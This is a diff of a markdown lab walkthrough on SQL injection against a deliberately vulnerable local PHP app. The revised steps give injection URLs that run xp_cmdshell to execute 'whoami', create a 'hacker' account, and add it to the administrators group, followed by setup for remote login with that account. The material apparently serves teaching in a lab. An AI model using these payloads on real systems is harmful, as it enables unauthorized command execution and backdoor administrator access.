@@ -156,20 +156,19 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
 11. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
 12. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
     ```
-    http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
-    whoami
+    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'whoami';--
     ```
-    ![image](https://github.com/user-attachments/assets/e1b3a5b4-666f-430c-a7f7-791d17e43050)
+    ![image](https://github.com/user-attachments/assets/9ec1f657-8509-40ee-b7a0-4b1e167e1871)
 13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
     ```
-    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
-    net user hacker hacked1337 /add
+    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
     ```
+    ![image](https://github.com/user-attachments/assets/ce9bf90a-b36b-4902-b714-12e10b5b0c96)
 14. To add this user to the local administrators group, add the following
     ```
-    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
-    net localgroup administrators hacker /add
+    http://localhost/vulnsql/vuln.php?id=1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
     ```
+    ![image](https://github.com/user-attachments/assets/96fdb9ff-dda0-4a0d-aa6f-dedda6123939)
 15. To verify `hacker` was added, check in cmd or PowerShell after adding the user
     ![image](https://github.com/user-attachments/assets/6226b921-0ba3-490c-b937-aa8fdd775137)
 16. To test RDP into the server with the new malicious credentials, enable enable PowerShell remoting between a local and target VMs, and get the IP address of the target remote machine. Then set it as a trusted host on the local machine to allow remote connections. Run each of the commands below
